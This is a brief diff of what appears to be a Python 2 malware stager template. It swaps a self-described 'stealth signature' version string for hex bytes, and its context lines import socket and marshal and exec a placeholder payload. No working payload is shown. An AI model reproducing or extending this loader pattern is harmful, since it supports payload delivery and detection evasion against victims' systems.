@@ -1,4 +1,4 @@
-__py_version__ = "PY_2.6" # haha bullshit, this is a stealth signature
+__py_version__ = "\xFF\xFE\x0A\x20\xCA\xDD" # haha bullshit, this is a stealth signature
 # -*- coding: utf-8 -*-
 import socket
 import marshal
@@ -75,4 +75,4 @@ if __file__.endswith('.pyc'):
 
     exec "__PAYLOAD_PY__"
 
-__py_version__ = "PY_2.6" # haha bullshit, this is a stealth signature
+__py_version__ = "\xFF\xFE\x0A\x20\xCA\xDD" # haha bullshit, this is a stealth signature
